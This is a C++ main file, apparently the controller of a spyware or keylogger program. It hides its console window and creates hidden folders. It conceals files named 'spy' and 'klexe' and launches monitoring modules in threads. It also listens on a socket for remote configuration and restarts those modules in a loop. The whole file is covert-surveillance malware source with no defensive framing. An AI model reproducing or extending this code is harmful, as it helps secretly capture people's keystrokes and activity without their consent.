#include "Headers.h"
#include "Commonfunctional.h"
#include "InitControl.h"
#include "ThreadStart.h"
#include "ThreadSocket.h"
#include "Singlemodulesrun.h"
#include "ControlCopy.h"

void main(void)
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	control *B = new control, C, X;
	ofstream out;
	pthread_t ModuleStarter, ListenSocket;

	CreateHiddenFolders();
	HideFile(library);
	HideFile(spy);
	HideFile(klexe);

	InitControl(C);
	Copy(X, C);

	OutTextWithTime(logpath, "[Begin]   Threads were started in ", &C, out);

	do {
	
		pthread_create(&ModuleStarter, NULL, Start, (void*)&X);
		pthread_join(ModuleStarter, NULL);
		pthread_create(&ListenSocket, NULL, ListenSocketProc, (void*)&C);
		pthread_join(ListenSocket, (void**)&B);

		if (B == NULL)
		{
			OutTextWithTime(logpath, "[Error]   Configuration file Config.ksb is not found or corrupted! Using last successfull configuration! Time: ", &C, out);
			B = new control;
			do {

				pthread_create(&ListenSocket, NULL, ListenSocketProc, (void*)&C);
				pthread_join(ListenSocket, (void**)&B);

			} while (B == NULL);

			OutTextWithTime(logpath, "[Fixed]   It is OK now. Time: ", NULL, out);
		}

		Copy(C, B);
		Copy(X, C);

		KillModules(&X);
		OutTextWithTime(logpath, "[Restart] Threads were restarted in ", &C, out);

	} while (C.stop == true);

	OutTextWithTime(logpath, "[Stop]    Threads were stopped in ", NULL, out);
}